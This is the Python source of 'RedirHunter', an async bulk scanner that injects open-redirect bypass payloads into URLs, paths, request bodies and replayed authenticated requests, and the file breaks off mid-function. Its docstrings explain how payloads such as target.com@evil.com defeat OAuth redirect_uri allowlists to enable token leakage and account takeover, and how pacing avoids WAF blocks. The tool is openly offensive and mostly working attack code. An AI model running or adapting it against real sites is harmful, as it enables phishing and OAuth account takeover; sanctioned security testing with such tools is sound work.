#!/usr/bin/env python3
"""
RedirHunter (two-stage)
========================
Async bulk scanner for open-redirect vulnerabilities across large recon
target lists. Built for authorized bug bounty / pentest engagements only.

Two-stage model
----------------
STAGE 1 (host-only): payloads that only need YOUR domain (-t/--target-domain),
e.g. //evil.com, encoded-slash tricks, param pollution, full percent-encoding.
No knowledge of the site's own trusted domain is required.

STAGE 2 (target-based): payloads that also embed the SITE'S OWN trusted
domain as a decoy/confusion string, e.g. target.com@evil.com,
target.com%00https://evil.com. These are the ones that matter most for
SSO/OAuth redirect_uri validation bypasses and 1-click account takeover,
because most real allowlist checks are "does the URL contain/start with our
own domain" - which these are specifically designed to defeat.

Stage 1 always runs first, then Stage 2. Every payload template is
classified automatically: if it contains the literal token "{TARGET}" it's
Stage 2, otherwise Stage 1. Just drop new payloads into payloads.txt /
path_payloads.txt - no code changes needed.

Injection points tested
------------------------
- query_param   : payload injected into a query-string value
- path_prefix   : payload injected into the URL path itself, before the
                  site's real path (see path_payloads.txt for why this
                  matters - several real reports are path-based, not
                  query-based)
- param_pollution: a duplicate query parameter with the same name is
                  appended alongside the original value (some backends read
                  the LAST occurrence, defeating allowlist checks that only
                  validated the first)
- raw_request    : replays a captured request (see --request-file below)
                  with the payload substituted into its {} marker(s) -
                  for flows that only become vulnerable after a prior
                  action, like a real login

Input syntax
------------
Plain URL (auto-detect mode - tool finds known redirect params itself):
    https://example.com/login?redirect=/dashboard

Marked URL (manual mode - you tell it exactly which param + where to inject):
    https://example.com/login?redirect={}
    https://example.com/go>next={}          (param not already present in URL)

Usage
-----
    python3 redirhunter.py -i urls.txt -t your-collab-domain.oastify.com -o results.json
    python3 redirhunter.py -i "https://x.com/r?url={}" -t evil.com -T x.com --only-vuln
    python3 redirhunter.py -i urls.txt -t evil.com --proxy http://127.0.0.1:8080
    python3 redirhunter.py -i "https://x.com/reset" -t evil.com -T x.com \\
        --method POST --body reset_body.json --only-vuln

Author: built for authorized security testing only. Do not use against
targets you do not have explicit written permission to test.
"""

import argparse
import asyncio
import csv
import json
import re
import sys
import time
from dataclasses import dataclass, asdict
from pathlib import Path
from urllib.parse import urlsplit, urlunsplit, urljoin, parse_qsl, urlencode, quote

try:
    import aiohttp
except ImportError:
    print("[!] Missing dependency 'aiohttp'. Install with: pip install -r requirements.txt")
    sys.exit(1)

try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
    COLOR = True
except ImportError:
    COLOR = False

    class _NoColor:
        def __getattr__(self, _):
            return ""
    Fore = Style = _NoColor()

DEFAULT_UA = "Mozilla/5.0 (X11; Linux x86_64) RedirHunter/2.2"
INJECTION_TOKEN = "{}"
TARGET_TOKEN = "{TARGET}"
FUZZ_TOKEN = "{{}}"


class RateLimiter:
    """Global, strictly-paced rate limiter shared across all concurrent
    workers. Blasting every payload at once is the fastest way to trip a
    WAF or get your IP blocked mid-scan, so requests are spaced out to a
    fixed rate (default 5/sec) regardless of --concurrency."""

    def __init__(self, rate_per_sec: float):
        self.interval = 1.0 / rate_per_sec if rate_per_sec and rate_per_sec > 0 else 0.0
        self._lock = asyncio.Lock()
        self._next_time = 0.0

    async def wait(self):
        if self.interval <= 0:
            return
        async with self._lock:
            now = time.monotonic()
            start = max(now, self._next_time)
            self._next_time = start + self.interval
        delay = start - time.monotonic()
        if delay > 0:
            await asyncio.sleep(delay)


def safe_display(s: str) -> str:
    """Render control/non-printable characters (null bytes, CR/LF, etc.) as
    visible escapes for console output, so a payload never corrupts the
    terminal or silently disappears from the printed line. Raw values are
    still preserved untouched in the CSV/JSON output."""
    return s.encode("unicode_escape").decode("ascii", errors="replace")

# Params where a successful redirect is especially high-impact: SSO/OAuth
# flows where a bypass can mean token leakage or 1-click account takeover.
OAUTH_PARAMS = {
    "redirect_uri", "return_to", "callback", "callback_url",
    "post_logout_redirect_uri", "client_redirect_uri", "oauth_redirect",
    "sso_redirect", "auth_redirect", "continue",
}

META_REFRESH_RE = re.compile(
    r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+content=["\'][^;]+;\s*url=([^"\'>]+)',
    re.IGNORECASE,
)
JS_REDIRECT_RE = re.compile(
    r'(?:window\.)?location(?:\.href)?\s*=\s*["\']([^"\']+)["\']'
    r'|location\.replace\(\s*["\']([^"\']+)["\']\s*\)',
    re.IGNORECASE,
)


# --------------------------------------------------------------------------- #
# Data model
# --------------------------------------------------------------------------- #

@dataclass
class TestResult:
    stage: int
    technique: str
    original_input: str
    tested_param: str
    payload: str
    test_url: str
    oauth_flag: bool = False
    status: int = 0
    response_size: int = 0
    baseline_size: int = 0
    location_header: str = ""
    verdict: str = "ERROR"
    confidence: str = ""
    error: str = ""
    elapsed_ms: int = 0
    callback_verified: bool = False
    callback_status: int = 0


@dataclass
class Job:
    original_input: str   # what's shown to the user as "this is what I tested"
    param: str
    template: str          # URL with %%PAYLOAD%% marker
    raw_line: str = ""      # full original line, used for param-pollution
    allow_pollution: bool = False


@dataclass
class FuzzResult:
    """Result of one candidate param-name fuzz test. Deliberately separate
    from TestResult - fuzzing is a discovery pass (which param name even
    triggers a redirect at all?), not a bypass-payload test, so it doesn't
    carry stage/technique/oauth_flag concepts. Shares the same 'verdict'/
    'error' field names as TestResult on purpose so print_error_summary()
    works unmodified on either list."""
    param_name: str
    test_url: str
    status: int = 0
    response_size: int = 0
    location_header: str = ""
    verdict: str = "NOT_REDIRECT_PARAM"   # or "REDIRECT_PARAM" / "ERROR"
    error: str = ""
    elapsed_ms: int = 0
    callback_fetched: bool = False
    callback_status: int = 0
    callback_size: int = 0
    source_line: str = ""


# --------------------------------------------------------------------------- #
# Loading input / wordlists
# --------------------------------------------------------------------------- #

def load_lines(path_or_text: str) -> list[str]:
    p = Path(path_or_text)
    if p.is_file():
        with open(p, "r", encoding="utf-8", errors="ignore") as f:
            return [ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("#")]
    return [path_or_text.strip()]


def ensure_scheme(line: str, default_scheme: str = "https") -> str:
    """If a URL is missing http:// or https://, add one rather than let it
    silently fail every single request. Applies the same way whether the
    line came from a single -i URL or from every line of a file - a missing
    scheme is a missing scheme either way. Handles the '>' and '{}' marker
    syntaxes by checking/fixing the base URL portion, not the marker."""
    base = line
    suffix = ""
    if ">" in line and INJECTION_TOKEN not in line.split(">", 1)[0]:
        base, rest = line.split(">", 1)
        suffix = ">" + rest
    split = urlsplit(base)
    if split.scheme in ("http", "https") and split.netloc:
        return line
    fixed_base = f"{default_scheme}://{base}"
    return fixed_base + suffix


def load_wordlist(path: str) -> list[str]:
    lines = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            ln = ln.strip()
            if ln and not ln.startswith("#"):
                lines.append(ln)
    return lines


def is_stage2(template: str) -> int:
    return 2 if TARGET_TOKEN in template else 1


# --------------------------------------------------------------------------- #
# Dynamic payload generation (host-dependent, computed once per run)
# --------------------------------------------------------------------------- #

def full_percent_encode(s: str) -> str:
    return "".join(f"%{ord(c):02X}" for c in s)


def double_encode_last_dot(domain: str) -> str:
    """Replace only the final dot with its double-encoded form (%252E).
    Defeats filters that strip/check the literal '.tld' suffix but decode
    the URL only once (a reported real-world bypass: example.com encoded as
    example%252Ecom got past a filter that otherwise stripped the literal
    '.com' suffix)."""
    idx = domain.rfind(".")
    if idx == -1:
        return domain
    return domain[:idx] + "%252E" + domain[idx + 1:]


def generate_dynamic_payloads(host: str) -> tuple[list[str], list[str]]:
    """Returns (extra_query_payloads, extra_path_payloads). Both are plain
    strings with no {HOST}/{TARGET} tokens left (already fully rendered for
    this host), so they slot into the normal pipeline unchanged and are
    auto-classified as Stage 1 (no {TARGET} token present)."""
    extra_query = [
        "https://" + full_percent_encode(host),          # full percent-encoding
    ]
    extra_path = [
        "/%2f" + double_encode_last_dot(host),            # double-encoded dot
        "/%2f%2f" + full_percent_encode(host),
    ]
    return extra_query, extra_path


# --------------------------------------------------------------------------- #
# Parsing input lines into query-param Jobs
# --------------------------------------------------------------------------- #

def parse_input_line(line: str, known_params: set[str], body_mode: bool = False) -> list[Job]:
    jobs: list[Job] = []

    # Manual override syntax: BASEURL>param={}
    if ">" in line and INJECTION_TOKEN not in line.split(">", 1)[0]:
        base, override = line.split(">", 1)
        override = override.strip()
        m = re.match(r"^([A-Za-z0-9_\-\[\].]+)=(.*)$", override)
        if m and INJECTION_TOKEN in m.group(2):
            param = m.group(1)
            split = urlsplit(base)
            qs = dict(parse_qsl(split.query, keep_blank_values=True))
            qs[param] = "%%PAYLOAD%%"
            new_query = urlencode(qs, safe="%")
            template = urlunsplit((split.scheme, split.netloc, split.path, new_query, split.fragment))
            jobs.append(Job(base, param, template, raw_line=base, allow_pollution=False))
            return jobs

    # Inline {} directly in the line, e.g. https://x.com/r?url={}
    if INJECTION_TOKEN in line:
        split = urlsplit(line)
        qs = parse_qsl(split.query, keep_blank_values=True)
        found = False
        new_qs = []
        target_param = None
        for k, v in qs:
            if INJECTION_TOKEN in v:
                new_qs.append((k, "%%PAYLOAD%%"))
                target_param = k
                found = True
            else:
                new_qs.append((k, v))
        if found:
            new_query = urlencode(new_qs, safe="%")
            template = urlunsplit((split.scheme, split.netloc, split.path, new_query, split.fragment))
            display = urlunsplit((split.scheme, split.netloc, split.path, "", ""))
            jobs.append(Job(display, target_param, template, raw_line="", allow_pollution=False))
            return jobs

    # Auto-detect mode: scan existing query params against known redirect param wordlist.
    # This is also the ONLY branch where param-pollution makes sense, since it's
    # the only case where a genuine original value exists to duplicate alongside.
    split = urlsplit(line)
    if not split.scheme or not split.netloc:
        return jobs

    qs = parse_qsl(split.query, keep_blank_values=True)
    if qs:
        for k, _ in qs:
            if k.lower() in known_params:
                new_qs = [(kk, "%%PAYLOAD%%" if kk == k else vv) for kk, vv in qs]
                new_query = urlencode(new_qs, safe="%")
                template = urlunsplit((split.scheme, split.netloc, split.path, new_query, split.fragment))
                jobs.append(Job(line, k, template, raw_line=line, allow_pollution=True))
    else:
        # In POST+body mode the query string is irrelevant (the payload goes
        # into the request body instead), so one placeholder job is enough -
        # looping over multiple fake probe param names would just triple the
        # request count for no benefit, and no query marker is needed at all.
        if body_mode:
            jobs.append(Job(line, "(body)", line, raw_line="", allow_pollution=False))
        else:
            for probe in ("redirect", "url", "next"):
                qs2 = [(probe, "%%PAYLOAD%%")]
                new_query = urlencode(qs2, safe="%")
                template = urlunsplit((split.scheme, split.netloc, split.path, new_query, split.fragment))
                jobs.append(Job(line, probe, template, raw_line="", allow_pollution=False))

    return jobs


def collect_path_injection_lines(lines: list[str]) -> list[str]:
    """Path-prefix injection applies to any valid absolute URL, with or
    without query params - it exploits path parsing, not param handling."""
    out = []
    for line in lines:
        base = line.split(">", 1)[0].split("{}")[0] if (">" in line or "{}" in line) else line
        split = urlsplit(base)
        if split.scheme and split.netloc:
            out.append(base)
    return out


# --------------------------------------------------------------------------- #
# Raw request mode (authenticated / multi-step flows)
# --------------------------------------------------------------------------- #

def parse_raw_request(text: str) -> dict:
    """Parse a raw HTTP request as saved from Burp Suite ('Copy to file' /
    'Save item') or similar tools. Expects a request line, headers, a blank
    line, then an optional body. The injection point is marked with a
    literal '{}' anywhere in the request line (path/query) and/or the body -
    every occurrence gets replaced with the same rendered payload.

    This is what makes authenticated / multi-step flows testable: capture
    the exact authenticated request in Burp once (correct cookies, CSRF
    token, form fields, session state already satisfied), save it to a file,
    mark the redirect parameter with {}, and the tool replays that exact
    request per payload rather than trying to log in itself."""
    normalized = text.replace("\r\n", "\n")
    lines = normalized.split("\n")
    if not lines:
        raise ValueError("Empty request file.")

    request_line = lines[0].strip()
    parts = request_line.split(" ")
    if len(parts) < 2:
        raise ValueError(f"Could not parse request line: {request_line!r}")
    method, path = parts[0].upper(), parts[1]

    headers: dict[str, str] = {}
    body_lines: list[str] = []
    in_body = False
    for ln in lines[1:]:
        if not in_body:
            if ln.strip() == "":
                in_body = True
                continue
            if ":" in ln:
                k, v = ln.split(":", 1)
                headers[k.strip()] = v.strip()
        else:
            body_lines.append(ln)

    body = "\r\n".join(body_lines)
    # Content-Length is recomputed automatically once the payload is
    # substituted in; a stale value from the saved file would be wrong.
    headers.pop("Content-Length", None)
    headers.pop("content-length", None)

    if INJECTION_TOKEN not in path and INJECTION_TOKEN not in body:
        raise ValueError("No '{}' injection marker found in the request line or body. "
                          "Mark exactly where the payload should go, e.g. "
                          "'GET /profile?url={} HTTP/1.1' or a form field 'url={}' in the body.")

    return {"method": method, "path": path, "headers": headers, "body": body}


# --------------------------------------------------------------------------- #
# Payload rendering
# --------------------------------------------------------------------------- #

def render_payload(template: str, host: str, target: str) -> str:
    return (template.replace("{HOST}", host)
                     .replace("{TARGET}", target)
                     .replace("{NULLBYTE}", "\x00"))


def build_pollution_url(raw_line: str, param: str, rendered_payload: str,
                         encode_payload: bool = False) -> str | None:
    """Duplicate `param` alongside its original value in raw_line's query
    string, e.g. ?redirect_uri=target.com&redirect_uri=https://evil.com - a
    real reported bypass for backends that validate the first occurrence
    but act on the last. Returns None if `param` isn't actually present in
    raw_line's query (pollution only makes sense when there's a genuine
    original value to duplicate alongside). Pulled out as its own pure
    function so the URL-construction logic is unit-testable without
    spinning up an HTTP session."""
    split = urlsplit(raw_line)
    qs = parse_qsl(split.query, keep_blank_values=True)
    if not any(k == param for k, _ in qs):
        return None
    payload_str = quote(rendered_payload, safe="") if encode_payload else rendered_payload
    sep = "&" if split.query else "?"
    return (urlunsplit((split.scheme, split.netloc, split.path, split.query, split.fragment))
            + f"{sep}{param}={payload_str}")


def build_test_url(url_template: str, payload: str, url_encode_payload: bool = False) -> str:
    payload_str = quote(payload, safe="") if url_encode_payload else payload
    return url_template.replace("%%PAYLOAD%%", payload_str)


def build_path_test_url(base_url: str, path_payload_rendered: str) -> str:
    split = urlsplit(base_url)
    original_path = split.path or "/"
    trimmed_path = original_path[1:] if original_path.startswith("/") else original_path
    new_path_and_prefix = path_payload_rendered + trimmed_path
    query_suffix = ("?" + split.query) if split.query else ""
    return f"{split.scheme}://{split.netloc}{new_path_and_prefix}{query_suffix}"


def path_injection_variants(base_url: str) -> list[tuple[str, str]]:
    """Returns (prefix, suffix) pairs marking every point in the path where a
    payload could be inserted: the domain root, and after every existing
    path segment. Root injection matters (domain.com//evil.com), but plenty
    of apps run a dedicated redirect/tracking endpoint behind a known path
    prefix (/go/, /out/, /r/, /redirect/...), where the payload needs to
    land AFTER that prefix, not before it."""
    split = urlsplit(base_url)
    path = split.path or "/"
    if path == "/":
        return [("", "/")]
    segments = path.split("/")  # e.g. ['', 'redirect10', 'x']
    variants = [("", path)]     # root injection: before the whole path
    running_prefix = ""
    for seg in segments[1:]:
        running_prefix += "/" + seg
        remainder = path[len(running_prefix):]
        if remainder:
            variants.append((running_prefix, remainder))
    return variants


def build_path_test_url_at(base_url: str, path_payload_rendered: str, prefix: str, suffix: str) -> str:
    split = urlsplit(base_url)
    trimmed_suffix = suffix[1:] if suffix.startswith("/") else suffix
    new_path = f"{prefix}{path_payload_rendered}{trimmed_suffix}"
    query_suffix = ("?" + split.query) if split.query else ""
    return f"{split.scheme}://{split.netloc}{new_path}{query_suffix}"


# --------------------------------------------------------------------------- #
# Fuzz mode - param-name discovery
# --------------------------------------------------------------------------- #

def render_fuzz_url(line: str, param_name: str, value: str) -> str:
    """Replace the literal '{{}}' query key with a candidate param name, and
    its value with the fixed fuzz test value (whatever was typed after '='
    in the input line is ignored - the actual value always comes from
    -t, same as everywhere else in the tool)."""
    split = urlsplit(line)
    qs = parse_qsl(split.query, keep_blank_values=True)
    new_qs = [(param_name, value) if k == FUZZ_TOKEN else (k, v) for k, v in qs]
    new_query = urlencode(new_qs, safe="%")
    return urlunsplit((split.scheme, split.netloc, split.path, new_query, split.fragment))


def build_bypass_url_from_fuzz(line: str, param_name: str) -> str:
    """Turns a fuzz line + a confirmed param name into a ready-to-paste
    normal-mode bypass command target, e.g. after finding 'redirect_uri' is
    live, hand back '...?redirect_uri={}' for the next run."""
    split = urlsplit(line)
    qs = parse_qsl(split.query, keep_blank_values=True)
    new_qs = [(param_name, INJECTION_TOKEN) if k == FUZZ_TOKEN else (k, v) for k, v in qs]
    new_query = urlencode(new_qs, safe="{}")
    return urlunsplit((split.scheme, split.netloc, split.path, new_query, split.fragment))


# --------------------------------------------------------------------------- #
# Detection logic
# --------------------------------------------------------------------------- #

def host_matches(candidate_url: str, target_host: str, base_url: str = "") -> bool:
    """Resolve candidate_url the way a browser actually would - as a
    relative reference against the real request URL, using RFC 3986
    resolution (urljoin) - then compare the RESULTING host. This is far
    more accurate than pattern-matching for '//' or '@': a value like
    '/..//evil.com' contains '//' but resolves to the SAME origin once you
    actually run dot-segment normalization against a real base URL, while
    '//evil.com' with no base resolves off-site. Guessing via regexes
    produced false positives on exactly this kind of case."""
    if not candidate_url:
        return False
    candidate_url = candidate_url.strip()
    try:
        resolved = urljoin(base_url or "http://__scanner_base__/", candidate_url)
        host = urlsplit(resolved).hostname or ""
    except ValueError:
        return False
    host = host.lower()
    target_host = target_host.lower()
    return host == target_host or host.endswith("." + target_host)


def has_host_confusion_markers(candidate: str) -> bool:
    """Only treat a raw-substring match as meaningful when the string shows
    some actual sign of host-boundary confusion - used only as a
    low-confidence fallback for cases where standards-compliant resolution
    disagrees with how a real browser might parse an exotic/malformed
    string. The two signals that actually correlate with real
    parser-disagreement bugs are an @ userinfo split and control characters
    (null bytes, tab, etc). A plain scheme prefix like 'https:' does NOT
    belong here - it's true of virtually every normal URL and doesn't
    indicate any ambiguity by itself; including it was the direct cause of
    a false positive on 'https://safe.com#@evil.com' (unambiguously
    same-origin - both RFC 3986 and WHATWG agree the host ends at '#').

    A '#' or '?' unambiguously ends the authority component in both RFC
    3986 and WHATWG URL parsing, so an '@' appearing only AFTER one of
    those is not actually ambiguous either. Only look for '@' before the
    first '#' or '?', where it could genuinely be read as a userinfo
    separator."""
    cutoff = len(candidate)
    for sep in ("#", "?"):
        idx = candidate.find(sep)
        if idx != -1:
            cutoff = min(cutoff, idx)
    authority_ish_part = candidate[:cutoff]
    return "@" in authority_ish_part or any(ord(c) < 32 for c in candidate)


def evaluate(status: int, location: str, body: str, target_host: str, base_url: str = "") -> tuple[str, str]:
    if 300 <= status < 400 and location:
        if host_matches(location, target_host, base_url):
            return "VULNERABLE", "confirmed (Location header)"
        if has_host_confusion_markers(location) and target_host.lower() in location.lower():
            return "VULNERABLE", "possible (target appears in Location as raw text but not as parsed host - parser-dependent, verify in an actual browser)"
        return "NOT VULNERABLE", ""

    if body:
        m = META_REFRESH_RE.search(body)
        if m:
            candidate = m.group(1)
            if host_matches(candidate, target_host, base_url):
                return "VULNERABLE", "possible (meta-refresh, verify manually)"
            if has_host_confusion_markers(candidate) and target_host.lower() in candidate.lower():
                return "VULNERABLE", "possible (meta-refresh, target as raw text only - parser-dependent, verify in browser)"
        m2 = JS_REDIRECT_RE.search(body)
        if m2:
            candidate = m2.group(1) or m2.group(2)
            if candidate:
                if host_matches(candidate, target_host, base_url):
                    return "VULNERABLE", "possible (JS redirect, verify manually)"
                if has_host_confusion_markers(candidate) and target_host.lower() in candidate.lower():
                    return "VULNERABLE", "possible (JS redirect, target as raw text only - parser-dependent, verify in browser)"

    return "NOT VULNERABLE", ""


# --------------------------------------------------------------------------- #
# Scope filtering
# --------------------------------------------------------------------------- #

def in_scope(url: str, scope_domains: list[str] | None) -> bool:
    if not scope_domains:
        return True
    host = (urlsplit(url).hostname or "").lower()
    return any(host == d.lower() or host.endswith("." + d.lower()) for d in scope_domains)


# --------------------------------------------------------------------------- #
# HTTP engine
# --------------------------------------------------------------------------- #

class Scanner:
    def __init__(self, args, query_payloads: list[str], path_payloads: list[str]):
        self.args = args
        self.query_payloads = query_payloads
        self.path_payloads = path_payloads
        self.sem = asyncio.Semaphore(args.concurrency)
        self.rate_limiter = RateLimiter(args.rate)
        # ssl=False disables certificate verification entirely - only do
        # that when explicitly asked (--insecure), since self-signed certs
        # and internal/lab targets are common in this line of work, but
        # silently skipping verification by default is bad practice.
        self.ssl = False if args.insecure else None
        self.results: list[TestResult] = []
        self.fuzz_results: list[FuzzResult] = []
        self.baseline_cache: dict[str, tuple[int, int]] = {}
        self.headers = {"User-Agent": DEFAULT_UA}
        if args.header:
            for h in args.header:
                if ":" in h:
                    k, v = h.split(":", 1)
                    self.headers[k.strip()] = v.strip()
        if args.body:
            self.headers.setdefault("Content-Type", args.content_type)
        self.cookies = {}
        if args.cookie:
            for part in args.cookie.split(";"):
                if "=" in part:
                    k, v = part.strip().split("=", 1)
                    self.cookies[k] = v
        self.body_template = None
        if args.body:
            with open(args.body, "r", encoding="utf-8") as f:
                # Strip exactly one trailing newline (the one virtually
                # every text editor/save operation adds). If {} is the
                # last thing in the template (a very common shape, e.g.
                # 'username=admin&password=x&url={}'), that trailing
                # newline becomes part of the substituted value itself -
                # which then makes Werkzeug (and most frameworks) reject
                # the resulting Location header as containing a newline,
                # turning every single working bypass into a false
                # "not vulnerable" 500. This isn't a payload problem, it's
                # a file-authoring artifact, and it would silently break
                # --body for nearly everyone without this fix.
                self.body_template = f.read().rstrip("\r\n")

    async def get_baseline(self, session, base_url: str) -> tuple[int, int]:
        if base_url in self.baseline_cache:
            return self.baseline_cache[base_url]
        try:
            async with session.get(base_url, allow_redirects=False, timeout=self.args.timeout, ssl=self.ssl) as resp:
                body = await resp.read()
                result = (resp.status, len(body))
        except Exception:
            result = (0, 0)
        self.baseline_cache[base_url] = result
        return result

    def own_host(self, url_or_line: str) -> str:
        if self.args.target_site:
            return self.args.target_site
        return urlsplit(url_or_line).hostname or ""

    def _request_kwargs(self, test_url: str, payload_for_body: str | None = None) -> tuple[dict, str]:
        """Returns (kwargs for session.request, http_method)."""
        method = self.args.method
        kwargs = dict(allow_redirects=False, timeout=self.args.timeout, ssl=self.ssl)
        if self.args.proxy:
            kwargs["proxy"] = self.args.proxy
        if method in ("POST", "PUT", "PATCH") and self.body_template is not None and payload_for_body is not None:
            if "json" in self.args.content_type.lower():
                # json.dumps() correctly escapes backslashes, quotes, and
                # control characters (a real null byte -> the valid JSON
                # escape \u0000) for safe embedding inside an existing JSON
                # string literal in the body template. Manual
                # .replace()-based escaping breaks on payloads that
                # legitimately contain backslashes or null bytes.
                substituted = json.dumps(payload_for_body)[1:-1]
            else:
                # Non-JSON body (e.g. application/x-www-form-urlencoded,
                # XML, plain text) - substitute the raw payload directly,
                # exactly like --request-file already does for these
                # formats. Applying JSON-string escaping to a body that
                # isn't JSON would corrupt it (e.g. turning a literal
                # backslash or quote in the payload into a JSON escape
                # sequence that means nothing in that format).
                substituted = payload_for_body
            kwargs["data"] = self.body_template.replace("{}", substituted)
        return kwargs, method

    def oauth_flag_for(self, param: str) -> bool:
        return param.lower() in OAUTH_PARAMS

    async def _verify_callback(self, session, location: str, base_url: str) -> tuple[bool, int]:
        """Actually fetch the resolved redirect target, rather than trusting
        the Location header string match alone. Proves the payload's target
        is a real, reachable server under your control (your box or your
        Collaborator listener), not just a string that happened to match."""
        try:
            resolved = urljoin(base_url or "http://__scanner_base__/", location)
        except ValueError:
            return False, 0
        try:
            async with session.get(resolved, timeout=self.args.callback_timeout,
                                    allow_redirects=False, ssl=self.ssl) as resp:
                return True, resp.status
        except Exception:
            return False, 0

    async def _fetch_after_redirect(self, session, location: str, base_url: str) -> tuple[bool, int, int]:
        """Same idea as _verify_callback but also returns response size -
        used by fuzz mode, which wants both the Location-header result AND
        what actually loads when you follow it, in one line of output."""
        try:
            resolved = urljoin(base_url or "http://__scanner_base__/", location)
        except ValueError:
            return False, 0, 0
        try:
            async with session.get(resolved, timeout=self.args.callback_timeout,
                                    allow_redirects=False, ssl=self.ssl) as resp:
                body = await resp.read()
                size = int(resp.headers.get("Content-Length", len(body)))
                return True, resp.status, size
        except Exception:
            return False, 0, 0

    async def _send_and_evaluate(self, session, test_url: str, target_domain: str,
                                  method: str, kwargs: dict) -> TestResult:
        t0 = time.monotonic()
        try:
            request_url = test_url if method == "GET" else test_url.split("?")[0]
            async with session.request(method, request_url, **kwargs) as resp:
                body = b""
                if self.args.read_body or method in ("POST", "PUT", "PATCH"):
                    body = await resp.read()
                size = int(resp.headers.get("Content-Length", len(body)))
                location = resp.headers.get("Location", "")
                elapsed = int((time.monotonic() - t0) * 1000)
                base_url = str(resp.url)
                verdict, confidence = evaluate(
                    resp.status, location,
                    body.decode(errors="ignore") if body else "",
                    target_domain, base_url=base_url,
                )
                callback_verified, callback_status = False, 0
                if (verdict == "VULNERABLE" and confidence.startswith("confirmed")
                        and not self.args.no_verify_callback):
                    callback_verified, callback_status = await self._verify_callback(
                        session, location, base_url)
                return TestResult(
                    stage=0, technique="", original_input="", tested_param="",
                    payload="", test_url=test_url,
                    status=resp.status, response_size=size,
                    location_header=location, verdict=verdict, confidence=confidence,
                    elapsed_ms=elapsed,
                    callback_verified=callback_verified, callback_status=callback_status,
                )
        except Exception as e:
            return TestResult(
                stage=0, technique="", original_input="", tested_param="",
                payload="", test_url=test_url,
                verdict="ERROR", error=str(e),
                elapsed_ms=int((time.monotonic() - t0) * 1000),
            )

    async def run_query_job(self, session, job: Job, payload_template: str, target_domain: str):
        stage = is_stage2(payload_template)
        own_host = self.own_host(job.raw_line or job.original_input)
        rendered_payload = render_payload(payload_template, target_domain, own_host)
        test_url = build_test_url(job.template, rendered_payload, self.args.encode_payload)

        baseline_size = 0
        if self.args.baseline:
            # Use the real original request (with its own original query
            # params intact - session tokens, other required fields, etc.)
            # as the baseline whenever we have it, rather than stripping
            # the query entirely. A bare path-only request often behaves
            # completely differently (different code path, auth failure,
            # missing required param) from the real request, which makes
            # the size-diff comparison misleading. Only fall back to a
            # bare path when there's no real original line to compare
            # against (e.g. the inline {} marker syntax with no prior
            # value for that param).
            baseline_url = job.raw_line or test_url.split("?")[0]
            _, baseline_size = await self.get_baseline(session, baseline_url)

        async with self.sem:
            await self.rate_limiter.wait()
            if self.args.delay:
                await asyncio.sleep(self.args.delay)
            kwargs, method = self._request_kwargs(test_url, rendered_payload)
            res = await self._send_and_evaluate(session, test_url, target_domain, method, kwargs)
        res.stage = stage
        res.technique = "query_param"
        res.original_input = job.original_input
        res.tested_param = job.param
        res.payload = rendered_payload
        res.baseline_size = baseline_size
        res.oauth_flag = self.oauth_flag_for(job.param)
        self.results.append(res)
        self.print_result(res)

    async def run_path_job(self, session, base_line: str, path_payload_template: str, target_domain: str,
                            prefix: str = "", suffix: str = "/"):
        stage = is_stage2(path_payload_template)
        own_host = self.own_host(base_line)
        rendered_payload = render_payload(path_payload_template, target_domain, own_host)
        test_url = build_path_test_url_at(base_line, rendered_payload, prefix, suffix)

        baseline_size = 0
        if self.args.baseline:
            _, baseline_size = await self.get_baseline(session, base_line)

        async with self.sem:
            await self.rate_limiter.wait()
            if self.args.delay:
                await asyncio.sleep(self.args.delay)
            kwargs, method = self._request_kwargs(test_url)
            res = await self._send_and_evaluate(session, test_url, target_domain, method, kwargs)
        res.stage = stage
        res.technique = f"path_prefix (inject after '{prefix}')" if prefix else "path_prefix (inject at root)"
        res.original_input = base_line
        res.tested_param = "(path)"
        res.payload = rendered_payload
        res.baseline_size = baseline_size
        self.results.append(res)
        self.print_result(res)

    async def run_pollution_job(self, session, job: Job, host_payload_literal: str, target_domain: str):
        """Duplicate the tested param alongside its original value, e.g.
        ?redirect_uri=target.com&redirect_uri=https://evil.com - a real
        reported bypass for backends that read the last occurrence."""
        own_host = self.own_host(job.raw_line)
        rendered_payload = render_payload(host_payload_literal, target_domain, own_host)
        test_url = build_pollution_url(job.raw_line, job.param, rendered_payload, self.args.encode_payload)
        if test_url is None:
            return

        async with self.sem:
            await self.rate_limiter.wait()
            if self.args.delay:
                await asyncio.sleep(self.args.delay)
            kwargs, method = self._request_kwargs(test_url)
            res = await self._send_and_evaluate(session, test_url, target_domain, method, kwargs)
        res.stage = 1
        res.technique = "param_pollution"
        res.original_input = job.raw_line
        res.tested_param = job.param
        res.payload = rendered_payload
        res.oauth_flag = self.oauth_flag_for(job.param)
        self.results.append(res)
        self.print_result(res)

    async def run_raw_request_job(self, session, raw_request: dict, payload_template: str,
                                   target_domain: str, scheme: str, host: str, target_site: str):
        """Replay a captured (e.g. authenticated) request with the payload
        substituted into every '{}' marker in the path and/or body. Used for
        flows where the redirect only triggers after some prior action
        (logging in, completing a step) - the captured request already
        carries whatever session/cookie/form state satisfies that."""
        stage = is_stage2(payload_template)
        own_host = target_site or host
        rendered_payload = render_payload(payload_template, target_domain, own_host)
        payload_str = quote(rendered_payload, safe="") if self.args.encode_payload else rendered_payload

        rendered_path = raw_request["path"].replace(INJECTION_TOKEN, payload_str)
        rendered_body = raw_request["body"].replace(INJECTION_TOKEN, payload_str) if raw_request["body"] else None
        full_url = f"{scheme}://{host}{rendered_path}"

        async with self.sem:
            await self.rate_limiter.wait()
            if self.args.delay:
                await asyncio.sleep(self.args.delay)
            kwargs = dict(allow_redirects=False, timeout=self.args.timeout, ssl=self.ssl)
            if self.args.proxy:
                kwargs["proxy"] = self.args.proxy
            if rendered_body is not None:
                kwargs["data"] = rendered_body.encode()
            t0 = time.monotonic()
            try:
                async with session.request(raw_request["method"], full_url,
                                            headers=raw_request["headers"], **kwargs) as resp:
                    body = b""
                    if self.args.read_body or raw_request["method"] != "GET":
                        body = await resp.read()
                    size = int(resp.headers.get("Content-Length", len(body)))
                    location = resp.headers.get("Location", "")
                    elapsed = int((time.monotonic() - t0) * 1000)
                    base_url = str(resp.url)
                    verdict, confidence = evaluate(
                        resp.status, location,
                        body.decode(errors="ignore") if body else "",
                        target_domain, base_url=base_url,
                    )
                    callback_verified, callback_status = False, 0
                    if (verdict == "VULNERABLE" and confidence.startswith("confirmed")
                            and not self.args.no_verify_callback):
